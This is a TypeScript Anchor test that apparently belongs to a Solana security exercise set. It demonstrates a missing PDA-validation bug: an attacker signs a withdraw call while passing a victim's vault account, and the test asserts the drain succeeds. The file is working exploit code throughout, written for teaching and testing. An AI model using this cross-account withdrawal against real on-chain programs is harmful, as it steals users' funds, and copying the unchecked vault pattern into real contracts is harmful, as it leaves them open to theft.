/**
 * EXPLOIT TEST: Incorrect PDA Validation (Anchor)
 * 
 * This test demonstrates the missing PDA validation vulnerability in the Anchor program.
 * 
 * Vulnerability: The withdraw instruction doesn't validate that the vault PDA is derived
 * from the user's public key. An attacker can pass ANY vault account and withdraw from it,
 * as long as they sign the transaction.
 * 
 * Expected Result: The exploit should SUCCEED - attacker can drain victim's vault.
 */

import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { PublicKey, Keypair, SystemProgram, LAMPORTS_PER_SOL } from "@solana/web3.js";

describe("02-incorrect-pda-validation: Anchor Exploit", () => {
    const provider = anchor.AnchorProvider.env();
    anchor.setProvider(provider);

    const PROGRAM_ID = new PublicKey("HmbTLCmaGvZhKnn1Zfa1JVnp7vkMV4DYVxPLWBVoN65L");

    it("Exploits missing PDA validation to drain victim's vault", async () => {
        console.log("\nüéØ EXPLOIT: Incorrect PDA Validation (Anchor)\n");

        const idl = await Program.fetchIdl(PROGRAM_ID, provider);
        if (!idl) {
            throw new Error("IDL not found. Make sure the program is deployed.");
        }
        const program = new Program(idl, PROGRAM_ID, provider);

        // Create victim and attacker wallets
        const victim = Keypair.generate();
        const attacker = Keypair.generate();

        console.log("üë§ Victim:", victim.publicKey.toBase58());
        console.log("ü¶π Attacker:", attacker.publicKey.toBase58());

        // Airdrop SOL
        const airdropVictim = await provider.connection.requestAirdrop(
            victim.publicKey,
            2 * LAMPORTS_PER_SOL
        );
        await provider.connection.confirmTransaction(airdropVictim);

        const airdropAttacker = await provider.connection.requestAirdrop(
            attacker.publicKey,
            1 * LAMPORTS_PER_SOL
        );
        await provider.connection.confirmTransaction(airdropAttacker);

        // Derive vault PDAs
        const [victimVaultPda] = PublicKey.findProgramAddressSync(
            [Buffer.from("vault"), victim.publicKey.toBuffer()],
            PROGRAM_ID
        );

        const [attackerVaultPda] = PublicKey.findProgramAddressSync(
            [Buffer.from("vault"), attacker.publicKey.toBuffer()],
            PROGRAM_ID
        );

        console.log("üè¶ Victim's Vault PDA:", victimVaultPda.toBase58());
        console.log("üè¶ Attacker's Vault PDA:", attackerVaultPda.toBase58());

        // Step 1: Victim initializes their vault
        console.log("\nüìù Step 1: Victim initializes vault...");
        await program.methods
            .initialize()
            .accounts({
                user: victim.publicKey,
                vault: victimVaultPda,
                systemProgram: SystemProgram.programId,
            })
            .signers([victim])
            .rpc();

        console.log("‚úÖ Victim's vault initialized");

        // Step 2: Victim deposits funds
        const depositAmount = 1 * LAMPORTS_PER_SOL;
        console.log(`\nüí∞ Step 2: Victim deposits ${depositAmount / LAMPORTS_PER_SOL} SOL...`);

        await program.methods
            .deposit(new anchor.BN(depositAmount))
            .accounts({
                user: victim.publicKey,
                vault: victimVaultPda,
                systemProgram: SystemProgram.programId,
            })
            .signers([victim])
            .rpc();

        const victimVaultBalance = await provider.connection.getBalance(victimVaultPda);
        console.log(`‚úÖ Victim's vault balance: ${victimVaultBalance / LAMPORTS_PER_SOL} SOL`);

        // Step 3: Attacker attempts to withdraw from victim's vault (EXPLOIT)
        const withdrawAmount = 0.5 * LAMPORTS_PER_SOL;
        console.log(`\nüö® Step 3: Attacker attempts to withdraw ${withdrawAmount / LAMPORTS_PER_SOL} SOL from victim's vault...`);
        console.log("‚ö†Ô∏è  Attacker signs but passes victim's vault!");

        const attackerBalanceBefore = await provider.connection.getBalance(attacker.publicKey);

        try {
            // ‚ùå VULNERABILITY: No PDA validation - attacker can pass victim's vault!
            await program.methods
                .withdraw(new anchor.BN(withdrawAmount))
                .accounts({
                    user: attacker.publicKey,      // ‚ùå Attacker signs
                    vault: victimVaultPda,         // ‚ùå But passes victim's vault!
                })
                .signers([attacker])
                .rpc();

            const attackerBalanceAfter = await provider.connection.getBalance(attacker.publicKey);
            const victimVaultBalanceAfter = await provider.connection.getBalance(victimVaultPda);

            console.log("\nüí• EXPLOIT SUCCESSFUL!");
            console.log(`ü¶π Attacker balance change: +${(attackerBalanceAfter - attackerBalanceBefore) / LAMPORTS_PER_SOL} SOL (approx, minus fees)`);
            console.log(`üè¶ Victim's vault balance after exploit: ${victimVaultBalanceAfter / LAMPORTS_PER_SOL} SOL`);
            console.log("\n‚ö†Ô∏è  The vulnerability allowed cross-user vault access!");
            console.log("‚ö†Ô∏è  Attacker drained victim's vault without owning it!");

        } catch (error) {
            console.log("\n‚ùå EXPLOIT FAILED (unexpected)");
            console.log("Error:", error.message);
            throw new Error("Exploit should have succeeded but failed. Check program deployment.");
        }
    });
});
